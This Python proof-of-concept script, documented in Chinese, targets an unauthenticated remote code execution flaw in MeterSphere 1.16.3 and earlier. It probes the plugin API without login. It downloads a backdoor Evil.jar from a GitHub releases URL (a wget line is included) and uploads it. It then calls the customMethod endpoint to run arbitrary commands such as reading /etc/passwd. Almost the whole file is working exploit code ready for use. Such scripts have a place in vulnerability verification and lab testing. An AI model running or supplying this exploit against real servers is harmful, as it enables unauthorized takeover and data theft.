#!/usr/bin/env python3
"""
MeterSphere 插件接口未授权RCE漏洞 POC
适用版本: MeterSphere <= 1.16.3

==================== 漏洞描述 ====================
【漏洞原理】
MeterSphere 1.16.3及之前版本中插件管理相关API(/plugin/*)未授权访问。
攻击者可上传恶意JAR插件到服务器，然后通过/plugin/customMethod调用插件中的
恶意类方法执行任意Java代码。

【影响范围】
- MeterSphere <= 1.16.3
- 端口: 8081

【危害等级】
- 无需认证直接RCE
- CVSS评分: 9.8 (Critical)

==================== 环境要求 ====================
- Python 3.6+
- requests库
- 前置: Evil.jar (从GitHub releases下载或自动下载)

==================== 验证步骤 ====================
1. 基础检测:
   python metersphere_plugin_rce.py http://target:8081 --check-only

2. 完整利用(自动下载Evil.jar):
   python metersphere_plugin_rce.py http://target:8081 -c id

3. 使用本地Evil.jar:
   python metersphere_plugin_rce.py http://target:8081 -c "cat /etc/passwd" --evil-jar ./Evil.jar

==================== 预期结果 ====================
- 成功时: 命令在服务器执行并返回结果
- 失败时: 目标已修复或Evil.jar下载失败
"""

import sys
import json
import os
import argparse
import requests
from typing import Dict, Optional
from urllib.parse import urljoin


class MeterSpherePluginRPCPOC:
    """MeterSphere 插件接口未授权RCE漏洞 POC"""

    VULN_NAME = "MeterSphere Plugin Unauthenticated RCE"
    CVE_ID = "N/A (MeterSphere <= 1.16.3)"
    SEVERITY = "CRITICAL (CVSS 9.8)"
    AFFECTED = "MeterSphere <= 1.16.3"

    EVIL_JAR_URL = "https://github.com/vulhub/metersphere-plugin-Backdoor/releases/download/v1.1.0/Evil.jar"

    def __init__(self, target: str, timeout: int = 15, proxy: str = None,
                 verify_ssl: bool = False):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.proxy = proxy
        self.verify_ssl = verify_ssl
        self.evil_jar_path = None

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = self.verify_ssl
        if self.proxy:
            session.proxies = {"http": self.proxy, "https": self.proxy}
        session.headers.update({"User-Agent": "Mozilla/5.0"})
        if not self.verify_ssl:
            requests.packages.urllib3.disable_warnings()
        return session

    def _download_evil_jar(self) -> Optional[str]:
        """从GitHub releases下载Evil.jar"""
        local_path = "/tmp/Evil.jar"
        if os.path.exists(local_path):
            print(f"[*] 使用已下载的Evil.jar: {local_path}")
            return local_path

        print(f"[*] 下载Evil.jar从: {self.EVIL_JAR_URL}")
        try:
            resp = requests.get(self.EVIL_JAR_URL, timeout=60)
            if resp.status_code == 200 and len(resp.content) > 1000:
                with open(local_path, "wb") as f:
                    f.write(resp.content)
                print(f"[+] 下载成功 ({len(resp.content)} bytes)")
                return local_path
            else:
                print(f"[-] 下载失败 (HTTP {resp.status_code})")
                return None
        except Exception as e:
            print(f"[-] 下载异常: {e}")
            return None

    def check(self) -> Dict:
        """
        步骤1: 检查MeterSphere服务状态
        步骤2: 检测/plugin/list未授权访问
        """
        result = {
            "vulnerability": self.VULN_NAME,
            "target": self.target,
            "status": "unknown",
            "details": [],
            "conclusion": ""
        }
        session = self._create_session()

        print("[*] 步骤1/2: 检查MeterSphere服务状态...")
        try:
            resp = session.get(self.target, timeout=self.timeout)
            if resp.status_code == 200:
                print(f"[+] MeterSphere服务正常")
                result["details"].append(f"HTTP {resp.status_code}")
            else:
                result["details"].append(f"状态码: {resp.status_code}")
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"服务不可达: {e}"
            return result

        print("[*] 步骤2/2: 检测/plugin/list未授权访问...")
        try:
            resp = session.get(
                urljoin(self.target, "/plugin/list"),
                timeout=self.timeout, allow_redirects=False
            )
            if resp.status_code == 200 and not resp.url.endswith("/login"):
                result["status"] = "suspected_vulnerable"
                result["details"].append("/plugin/list未授权访问成功")
                result["conclusion"] = (
                    "插件API未授权访问，存在RCE风险。\n"
                    "完整利用需Evil.jar:\n"
                    "  python metersphere_plugin_rce.py <target> -c id"
                )
            elif resp.status_code in (302, 401):
                result["status"] = "not_vulnerable"
                result["conclusion"] = "插件API需要认证，目标已修复"
            else:
                result["status"] = "unknown"
                result["conclusion"] = f"/plugin/list返回 {resp.status_code}"
        except Exception as e:
            result["details"].append(f"检测异常: {e}")

        return result

    def _upload_plugin(self, session: requests.Session, jar_path: str) -> bool:
        """上传恶意插件"""
        print(f"[*] 上传插件: {jar_path}")
        try:
            with open(jar_path, "rb") as f:
                jar_content = f.read()
            files = {"file": ("Evil.jar", jar_content, "application/java-archive")}
            resp = session.post(
                urljoin(self.target, "/plugin/add"),
                files=files, timeout=self.timeout
            )
            print(f"[+] 插件上传响应: HTTP {resp.status_code}")
            # 即使有报错，JAR可能已被加载到ClassLoader
            return True
        except Exception as e:
            print(f"[-] 上传异常: {e}")
            return False

    def _call_custom_method(self, session: requests.Session, command: str) -> Optional[str]:
        """调用插件自定义方法执行命令"""
        print(f"[*] 调用customMethod执行: {command}")
        try:
            resp = session.post(
                urljoin(self.target, "/plugin/customMethod"),
                json={"entry": "org.vulhub.Evil", "request": command},
                timeout=self.timeout
            )
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if isinstance(data, dict):
                        return json.dumps(data, indent=2, ensure_ascii=False)
                except Exception:
                    pass
                return resp.text
            return f"HTTP {resp.status_code}: {resp.text[:200]}"
        except Exception as e:
            return str(e)

    def exploit(self, command: str = "id") -> Dict:
        """
        利用插件接口执行命令
        步骤1: 检查Evil.jar可用性
        步骤2: 上传插件
        步骤3: 调用customMethod
        """
        result = {
            "vulnerability": self.VULN_NAME,
            "target": self.target,
            "command": command,
            "status": "exploiting",
            "details": [],
            "output": "",
            "conclusion": ""
        }
        session = self._create_session()

        # 步骤0: 获取Evil.jar
        if not self.evil_jar_path or not os.path.exists(self.evil_jar_path):
            jar = self._download_evil_jar()
            if not jar:
                result["status"] = "failed"
                result["conclusion"] = (
                    "无法获取Evil.jar。请手动下载:\n"
                    f"  wget {self.EVIL_JAR_URL} -O /tmp/Evil.jar\n"
                    "  python metersphere_plugin_rce.py <target> --evil-jar /tmp/Evil.jar -c id"
                )
                return result
            self.evil_jar_path = jar

        print(f"[*] 步骤1/3: 上传恶意插件...")
        if not self._upload_plugin(session, self.evil_jar_path):
            result["status"] = "failed"
            result["conclusion"] = "插件上传失败"
            return result
        result["details"].append("插件上传成功")

        print(f"[*] 步骤2/3: 调用customMethod...")
        output = self._call_custom_method(session, command)
        result["output"] = output
        result["details"].append(f"customMethod响应: {output[:100] if output else 'None'}...")

        if output and ("error" not in output.lower() or "command" in output.lower()):
            result["status"] = "exploited"
            result["conclusion"] = f"命令执行成功: {command}"
        else:
            result["status"] = "warning"
            result["conclusion"] = f"命令可能已执行，响应: {output[:100] if output else '无'}"

        return result

    def run(self, command: str = "id") -> Dict:
        print(f"[*] {self.VULN_NAME} - 开始验证")
        print(f"[*] 目标: {self.target}")
        print(f"[*] 严重等级: {self.SEVERITY}")
        print("-" * 60)
        return self.exploit(command)

    def print_result(self, result: Dict):
        status = result.get("status", "unknown")
        icons = {"exploited": "[+]", "vulnerable": "[+]", "suspected_vulnerable": "[?]",
                 "failed": "[-]", "not_vulnerable": "[-]", "warning": "[?]", "error": "[!]"}
        icon = icons.get(status, "[-]")
        print(f"\n{'=' * 60}")
        print(f"{icon} 漏洞: {result['vulnerability']}")
        print(f"    目标: {result['target']}")
        print(f"    状态: {status}")
        if result.get("command"):
            print(f"    命令: {result['command']}")
        if result.get("output"):
            out = result['output']
            print(f"    输出:\n{out[:600]}")
        print(f"    结论: {result.get('conclusion', '')}")
        print(f"{'=' * 60}")


def main():
    parser = argparse.ArgumentParser(
        description="MeterSphere插件接口未授权RCE漏洞验证POC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  python metersphere_plugin_rce.py http://target:8081 --check-only
  python metersphere_plugin_rce.py http://target:8081 -c id
  python metersphere_plugin_rce.py http://target:8081 -c "cat /etc/passwd" --evil-jar ./Evil.jar

前置条件:
  需要Evil.jar (自动从GitHub releases下载或使用--evil-jar指定)
        """
    )
    parser.add_argument("target", help="目标URL (e.g., http://192.168.1.100:8081)")
    parser.add_argument("--check-only", action="store_true", help="仅检测不利用")
    parser.add_argument("--evil-jar", help="Evil.jar路径 (默认从GitHub自动下载)")
    parser.add_argument("-c", "--command", default="id", help="要执行的命令 (默认: id)")
    parser.add_argument("-t", "--timeout", type=int, default=15, help="请求超时(秒)")
    parser.add_argument("--proxy", help="HTTP代理")
    parser.add_argument("-k", "--insecure", action="store_true", help="跳过SSL验证")
    parser.add_argument("-v", "--verbose", action="store_true", help="详细输出")
    parser.add_argument("--output", choices=["text", "json"], default="text")
    args = parser.parse_args()

    poc = MeterSpherePluginRPCPOC(
        target=args.target, timeout=args.timeout,
        proxy=args.proxy, verify_ssl=not args.insecure
    )

    if args.evil_jar:
        poc.evil_jar_path = args.evil_jar

    if args.check_only:
        result = poc.check()
    else:
        result = poc.run(args.command)

    if args.output == "json":
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        poc.print_result(result)


if __name__ == "__main__":
    main()
